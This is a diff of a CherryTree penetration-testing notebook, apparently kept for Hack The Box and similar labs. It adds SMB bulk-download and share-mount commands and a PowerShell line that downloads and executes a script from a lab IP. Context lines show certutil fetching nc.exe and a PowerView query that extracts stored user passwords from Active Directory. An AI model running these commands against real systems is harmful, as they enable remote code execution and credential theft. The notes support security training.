@@ -93,10 +93,19 @@ add the following to </rich_text>
     <rich_text>
 /hostshare /hostfiles 9p trans=virtio,version=9p2000.L,rw 0 0</rich_text>
   </node>
-  <node name="smbclient" unique_id="91" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1663434109" ts_lastsave="1663434130">
+  <node name="smbclient" unique_id="91" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1663434109" ts_lastsave="1666706008">
     <rich_text>list smbclient
 smbclient -L &lt;IP&gt; -U &lt;user&gt; -P &lt;pass&gt;
+
+
 </rich_text>
+    <rich_text family="monospace">smbclient '\\server\share'
+mask ""
+recurse ON
+prompt OFF
+cd 'path\to\remote\dir'
+lcd '~/path/to/download/to/'
+mget *</rich_text>
   </node>
   <node name="database" unique_id="8" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655393786" ts_lastsave="1655393844">
     <node name="sqllite" unique_id="9" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655393789" ts_lastsave="1655393790">
@@ -651,7 +660,7 @@ Get-ObjectACL "DC=testlab,DC=local" -ResolveGUIDs | ? {
 $FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru} | fl
 </rich_text>
     </node>
-    <node name="download_file" unique_id="97" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1663605128" ts_lastsave="1666521843">
+    <node name="download_file" unique_id="97" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1663605128" ts_lastsave="1666521863">
       <rich_text>certutil -f -split -urlcache http://10.10.XX.XX/nc.exe C:\temp\nc.exe
 
 </rich_text>
@@ -662,7 +671,7 @@ wget</rich_text>
       <rich_text family="monospace"> $myDownloadUrl -OutFile c:\file.ext</rich_text>
       <rich_text>
 
-</rich_text>
+IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')</rich_text>
     </node>
     <node name="check .net version" unique_id="100" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1664784197" ts_lastsave="1664784319">
       <rich_text>C:\windows\microsoft.net\framework&gt; ls</rich_text>
@@ -719,7 +728,7 @@ mget *</rich_text>
   <node name="smb_enum" unique_id="94" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1663517460" ts_lastsave="1663517460">
     <rich_text link="webs https://steflan-security.com/hack-the-box-blue-walkthrough/">https://steflan-security.com/hack-the-box-blue-walkthrough/</rich_text>
   </node>
-  <node name="linux" unique_id="15" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655394178" ts_lastsave="1663435601">
+  <node name="linux" unique_id="15" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655394178" ts_lastsave="1666706898">
     <rich_text>knowing filetype
 file &lt;filename&gt;
 
@@ -867,6 +876,13 @@ dpkg -i &lt;package_file&gt;.deb</rich_text>
 </rich_text>
       <rich_text family="monospace">wget -r -np -R "index.html*" </rich_text>
       <rich_text link="webs https://0a5000a903558665c06b54b600d7006b.web-security-academy.net/.git">https://0a5000a903558665c06b54b600d7006b.web-security-academy.net/.git</rich_text>
+    </node>
+    <node name="mount" unique_id="109" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1666706898" ts_lastsave="1666707144">
+      <rich_text>sudo mount -t nfs support.htb:support-tools /mnt -o nolock
+
+
+</rich_text>
+      <rich_text scale="h3">mount -t cifs \\\\10.10.11.174\\support-tools /mnt -o username=123,password=sharepassword,domain=nixcraft</rich_text>
     </node>
   </node>
   <node name="python_module" unique_id="17" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655394196" ts_lastsave="1663435801">
@@ -2354,8 +2370,5 @@ whoami</rich_text>
 
 </rich_text>
     <rich_text link="webs https://joe.black/leakengine.html">https://joe.black/leakengine.html</rich_text>
-  </node>
-  <node name="smb_enum" unique_id="93" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1663514056" ts_lastsave="1663563857">
-    <rich_text link="webs https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/">https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/</rich_text>
   </node>
 </cherrytree>
